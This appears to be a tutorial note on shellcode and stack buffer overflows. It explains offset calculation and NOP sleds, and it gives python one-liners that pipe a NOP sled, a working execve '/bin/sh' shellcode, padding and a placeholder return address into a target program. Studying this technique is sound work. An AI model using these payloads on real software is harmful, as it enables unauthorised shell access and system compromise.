# shell code
shell code quite literally is code that will open up a shell. More specifically, it is binary instructions that can be executed. Since shellcode is just machine code(in the form of binary instructions), you can usually start of by writing a C program to do what you want, compile it into assembly and extract the hex characters(alternatively it would involve writing your own assembly) 

Here’s the general process so far:

1.  Find out the address of the start of the buffer and the start address of the return address
2.  Calculate the difference between these addresses so you know how much data to enter to overflow
3.  Start out by entering the shellcode in the buffer, entering random data between the shellcode and the return address, and the address of the buffer in the return address

![](shell%20code/1_image.png)

memory addresses may not be the same on different systems, even across the same computer when the program is recompiled. So we can make this more flexible using a NOP instruction.

A NOP instruction is a no operation instruction - when the system processes this instruction, it does nothing, and carries on execution. A NOP instruction is represented using \\x90. Putting NOPs as part of the payload means an attacker can jump anywhere in the memory region that includes a NOP and eventually reach the intended instructions. This is what an injection vector would look like:

![](shell%20code/2_image.png)

`python -c “print (NOP * no_of_nops + shellcode + random_data * no_of_random_data + memory address)”`

`python -c “print(‘\x90’ * 30 + ‘\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05’ +`

`‘\x41’ * 60 +` 

`‘\xef\xbe\xad\xde’) | ./program_name`

 `”`

In some cases you may need to pass xargs before ./program\_name.

`python -c “print(‘\x90’ * 30 + ‘\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05’ + ‘\x41’ * 60 + ‘\xef\xbe\xad\xde’) | ./program_name`